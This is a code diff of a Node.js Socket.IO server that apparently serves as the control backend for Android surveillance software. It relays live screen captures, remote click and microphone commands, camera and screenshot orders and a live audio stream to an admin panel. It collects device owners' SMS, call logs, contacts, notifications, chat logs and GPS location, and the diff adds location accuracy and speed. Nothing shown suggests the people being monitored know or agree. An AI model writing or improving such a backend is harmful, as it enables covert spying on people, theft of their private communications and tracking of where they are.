@@ -18,7 +18,7 @@ const io = new Server(server, {
         origin: "*",
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e8, // 100MB (Audio/Image ke liye zaroori)
+    maxHttpBufferSize: 1e8, // 100MB
     pingTimeout: 60000,     
     pingInterval: 25000,    
     transports: ['websocket', 'polling']
@@ -45,98 +45,72 @@ app.use(express.static(__dirname));
 let devicesStatus = {}; 
 
 // ==================================================
-//  🔥 MAIN SOCKET LOGIC (Fixed for Camera & Audio)
+//  🔥 MAIN SOCKET LOGIC
 // ==================================================
 io.on('connection', (socket) => {
-    // console.log('🔌 New Connection:', socket.id);
-
-    // 1. Join Room (Device & Admin both use this)
+    
+    // 1. Join Room
     socket.on('join', (roomID) => {
         socket.join(roomID);
-        // console.log(`🔗 Joined: ${roomID}`);
     });
 
-    // 2. Screen Share (Device -> Admin)
+    // 2. Screen Share
     socket.on('screen-data', (data) => {
         socket.volatile.to(data.room).emit('screen-data', data.image);
     });
 
-    // 3. Control Events (Admin -> Device)
-    // Ye 'Scroll', 'Click' aur 'Start-Mic' handle karega
+    // 3. Control Events
     socket.on('control-event', (data) => {
-        // Data format: { room: "DEVICE_ID", action: "start-mic" }
         socket.to(data.room).emit('control-event', data);
     });
 
-    // 🔥 FIX 1: CAMERA & SCREENSHOT COMMANDS
-    // HTML Button -> Server -> Android
+    // 4. Command Handling
     socket.on('send-command', (data) => {
-        // console.log("📥 Command received:", data);
         if (data.targetId && data.command) {
             io.to(data.targetId).emit('command', data.command);
             
-            // Status update
             if(devicesStatus[data.targetId]) {
                 devicesStatus[data.targetId].command = data.command;
             }
         }
     });
 
-    // 🔥 FIX 2: AUDIO STREAM RELAY
-    // Android (Mic) -> Server -> HTML (Speaker)
-    socket.on('audio-stream', (data) => {
-        // Android bhejega: { room: "DEVICE_ID", data: <BinaryData> }
-        if (data.room && data.data) {
-            // Hum sirf Binary Data forward karenge HTML player ko
-            socket.to(data.room).emit('audio-stream', data.data);
+    // 5. Audio Stream Relay (Binary)
+    socket.on('audio-stream', (blob) => {
+        const rooms = socket.rooms;
+        for (const room of rooms) {
+            if (room !== socket.id) {
+                socket.to(room).emit('audio-stream', blob);
+            }
         }
     });
 
-    socket.on('disconnect', () => {
-        // console.log('❌ Disconnected:', socket.id);
-    });
+    socket.on('disconnect', () => { });
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running with Camera & Audio Support!');
+    res.send('✅ Server Running: Audio + Location Accuracy Fixed!');
 });
 
 // ==================================================
-//  ✅ UPLOAD SYSTEM (Images/Camera/Screenshots)
+//  ✅ UPLOAD SYSTEM (Images)
 // ==================================================
-
 app.post('/api/upload-image', (req, res) => {
     let { device_id, image_data, type } = req.body; 
     
     if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
-
     const id = device_id.toString().trim().toUpperCase();
     
     let folderPath = id;
-    if (type && type !== "null" && type !== "") {
-        folderPath = `${id}/${type}`; 
-    }
+    if (type && type !== "null" && type !== "") folderPath = `${id}/${type}`; 
 
     let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
 
     cloudinary.uploader.upload(base64Image, 
-        { 
-            folder: folderPath, 
-            public_id: Date.now().toString(), 
-            resource_type: "image", 
-            width: 1280, 
-            quality: "auto", 
-            fetch_format: "auto" 
-        }, 
+        { folder: folderPath, public_id: Date.now().toString(), resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" }, 
         (error, result) => {
-            if (error) {
-                console.log("Cloudinary Error:", error);
-                return res.status(500).json({ error: "Upload Failed" });
-            }
-            
-            // Socket se Admin ko bata do ki photo aa gayi
+            if (error) return res.status(500).json({ error: "Upload Failed" });
             io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
-            
             res.json({ status: "success", url: result.secure_url });
         }
     );
@@ -145,10 +119,7 @@ app.post('/api/upload-image', (req, res) => {
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const next_cursor = req.query.next_cursor || null;
-
-    cloudinary.api.resources({
-        type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true
-    }, 
+    cloudinary.api.resources({ type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true }, 
     (error, result) => {
         if (error) return res.json({ photos: [], next_cursor: null });
         const photos = result.resources.map(img => img.secure_url);
@@ -157,7 +128,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  ADMIN DASHBOARD & STATUS
+//  🔥 STATUS & LOCATION ACCURACY UPDATE
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -174,7 +145,8 @@ app.get('/api/device-status/:id', (req, res) => {
 
 app.post('/api/status', (req, res) => {
     try {
-        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
+        // 🔥 Added 'accuracy' and 'speed' here
+        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
         if (!device_id) return res.status(400).json({ error: "No ID" });
 
         const id = device_id.toString().trim().toUpperCase();
@@ -194,6 +166,8 @@ app.post('/api/status', (req, res) => {
             charging: (String(charging) === "true"),
             lat: lat || (devicesStatus[id]?.lat || 0),
             lon: lon || (devicesStatus[id]?.lon || 0),
+            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0), // ✅ SAVING ACCURACY
+            speed: speed || (devicesStatus[id]?.speed || 0),          // ✅ SAVING SPEED
             lastSeen: Date.now(),
             command: devicesStatus[id]?.command || "none" 
         };
@@ -204,22 +178,8 @@ app.post('/api/status', (req, res) => {
     }
 });
 
-// API Fallback for Commands (Optional, but kept for safety)
-app.post('/api/send-command', (req, res) => {
-    let { device_id, command } = req.body;
-    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
-    const id = device_id.toUpperCase().trim();
-    
-    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
-    devicesStatus[id].command = command;
-    
-    io.to(id).emit('command', command);
-    
-    res.json({ status: "success", command: command });
-});
-
 // ==================================================
-//  🔥 DATA STORAGE (SMS, Logs, etc.)
+//  🔥 DATA STORAGE (Updated for Location Accuracy)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -232,13 +192,19 @@ app.post('/api/upload_data', async (req, res) => {
     try {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
-        // Update Location
+        // 🔥 Update Live Location Status
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
+            
             if (locObj && (locObj.lat || locObj.latitude)) {
                 if (!devicesStatus[id]) devicesStatus[id] = { id: id };
+                
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
+                
+                // ✅ Capture Accuracy & Speed from Data Logs
+                devicesStatus[id].accuracy = locObj.accuracy || locObj.acc || 0;
+                devicesStatus[id].speed = locObj.speed || 0;
             }
         }
 
@@ -246,7 +212,6 @@ app.post('/api/upload_data', async (req, res) => {
 
         if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
             let existingData = [];
-            
             try {
                 const fileContent = await fs.promises.readFile(filePath, 'utf8');
                 existingData = JSON.parse(fileContent);
@@ -264,7 +229,6 @@ app.post('/api/upload_data', async (req, res) => {
         }
 
         await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
-        
         res.json({ status: "success" });
     } catch (error) {
         console.error("Data Write Error:", error);
@@ -286,4 +250,15 @@ app.get('/api/get-data/:device_id/:type', async (req, res) => {
     }
 });
 
-server.listen(PORT, () => console.log(`🚀 ROCKET SERVER RUNNING ON PORT ${PORT}`));
+// Fallback command API
+app.post('/api/send-command', (req, res) => {
+    let { device_id, command } = req.body;
+    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
+    const id = device_id.toUpperCase().trim();
+    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
+    devicesStatus[id].command = command;
+    io.to(id).emit('command', command);
+    res.json({ status: "success", command: command });
+});
+
+server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
